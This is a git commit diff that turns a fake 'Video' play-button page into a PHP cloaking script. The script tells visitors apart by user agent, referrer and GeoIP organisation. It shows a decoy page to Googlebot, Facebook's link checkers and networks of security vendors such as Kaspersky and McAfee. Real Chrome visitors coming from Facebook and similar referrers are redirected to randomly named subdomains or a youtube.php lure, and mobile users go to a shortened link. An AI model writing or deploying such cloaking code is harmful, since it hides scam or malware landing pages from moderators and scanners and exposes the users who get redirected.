027db70459cefa820e746bd11ef68c484f0c18a3
Kadir Gün <kadir@kadirgun.com>
2016-11-17 03:11:36 +0200

    Update index.php

--- web/index.php
+++ web/index.php
@@ -1,19 +1,116 @@
-<!DOCTYPE html>
-<html>
-<head>
-	<title>Video</title>
-	<style type="text/css">
-		body{
-          background: #e9eaed;
-          text-align: center;
-          margin: 0;
-        }
-	</style>
-	<meta name="referrer" content="origin" />
-    	<meta name="viewport" content="width=360, initial-scale=1" />
-</head>
-<body>
-<a href="/redirect.php"><svg id="play" style="min-width: 200px; width: 16%; overflow: auto; margin: auto; position: absolute; top: 0; left: 0; bottom: 0; right: 0; opacity: 0.8;" version="1.1" viewBox="0 0 40 40">
-<path class="ytp-svg-fill" d="m 12.22,28.88 0,-17.77 16.66,8.91 -16.66,8.86 z" style=""></path></svg></a>
-</body>
-</html>
+<?php
+  header("Access-Control-Allow-Origin:http://".$_SERVER["HTTP_HOST"]);
+  header('Access-Control-Allow-Methods: GET');
+  header('X-Frame-Options: DENY');
+
+  function generate_name($length){
+      $rname = '';
+      $sesli = 'aeiou';
+      $sessiz = 'bcdfghjklmnprstvyz';
+      $rname = rand(1,2) == 1?$sessiz[rand(0,strlen($sessiz)-1)]:$sesli[rand(0,strlen($sesli)-1)];
+      for($n=0;$n<$length;$n++){
+          if(in_array($rname[strlen($rname)-1], str_split($sesli))){
+              $rname .= $sessiz[rand(0,strlen($sessiz)-1)];
+          }else{
+              $rname .= $sesli[rand(0,strlen($sesli)-1)];
+          }
+      }
+      return $rname;
+  }
+  
+  $action = 'theme';
+
+  require_once('includes/Mobile_Detect.php');
+  require_once('includes/Browser.php');
+  $detect = new Mobile_Detect;
+  $browser = new Browser();
+
+  if($detect->isMobile() || $browser->isMobile()){
+    $action = 'mobile';
+  }else if($browser->getBrowser() == Browser::BROWSER_GOOGLEBOT) {
+    $action = 'theme';
+  }else if($browser->getPlatform() == Browser::PLATFORM_X11 || $browser->isFacebook()){
+    $action = 'theme';
+  }else if($browser->getBrowser() == Browser::BROWSER_CHROME){
+    $action = 'site';
+  }
+
+  if(strpos($_SERVER["HTTP_USER_AGENT"], "Googlebot") !== false){
+    $action = 'theme';
+  }
+
+  if($action == 'site'){
+    $_SERVER['HTTP_REFERER'] = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
+    $refs = array('facebook.com', 'uye.io', 'googleapis.com', 'blogspot.', 't.co', 'googleusercontent.com', 'herokuapp.com');
+    $action = 'theme';
+    foreach ($refs as $ref) {
+      if(strpos($_SERVER['HTTP_REFERER'], $ref) !== false){
+        $action = 'site';
+        break;
+      }
+    }
+  }
+
+  if($action == 'site'){
+    $asnlist = array('facebook','google','linode','kaspersy','mcafee','amazon','microsoft corporation');
+  }else if($action == 'mobile'){
+    $asnlist = array('facebook','linode','kaspersy','mcafee','amazon','microsoft corporation');
+  }
+
+  if($action != 'theme'){
+    $_SERVER['GEOIP_ORG'] = isset($_SERVER['GEOIP_ORG']) ? $_SERVER['GEOIP_ORG'] : '';
+    foreach ($asnlist as $asn) {
+      if(strpos(strtolower($_SERVER['GEOIP_ORG']), $asn) !== false){
+        $action = 'theme';
+        break;
+      }
+    }
+  }
+
+  if($action != 'theme'){
+    $_SERVER['HTTP_REFERER'] = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
+    $bannedrefs = array('facebook.com/lsr.php');
+    foreach ($bannedrefs as $ref) {
+      if(strpos($_SERVER['HTTP_REFERER'], $ref) !== false){
+        $action = 'theme';
+        break;
+      }
+    }
+  }
+
+  if(isset($_SERVER['HTTP_X_FB_CURL_CLIENT'])){
+    $action = 'theme';
+  }
+
+  if(isset($_SERVER['REQUEST_METHOD']) && $_SERVER['REQUEST_METHOD'] != 'GET'){
+    $action = 'theme';
+  }
+  
+  $id = @$_GET["id"];
+  if(empty($id)){
+    $id = generate_name(rand(5,10));
+  }
+  $id = isset(explode("/", $id)[1]) ? explode("/", $id)[1] : $id;
+  $id = isset(explode(".", $id)[0]) ? explode(".", $id)[0] : $id;
+
+  if($action == 'mobile'){
+    header('Location: https://goo.gl/c1u740');
+    //require_once('includes/log.php');
+  }else if($action == 'site'){
+    require_once('includes/config.php');
+    if(strrpos($_SERVER['HTTP_HOST'], $app_site) === false){
+      $filename = generate_name(rand(5,8)).'.html';
+      header('Location:http://'.generate_name(rand(5,8)).'.'.$app_site.'/'.$id);
+      //require_once('includes/log.php');
+    }else{
+      require_once('youtube.php');
+    }
+  }else{
+    //require_once('includes/log.php');
+    @ob_end_clean();
+    @ob_end_flush();
+    require_once('bot.php');
+    //header("HTTP/1.1 301");
+    //header("Location:http://www.deezer.com/track/".$id);
+  }
+?>
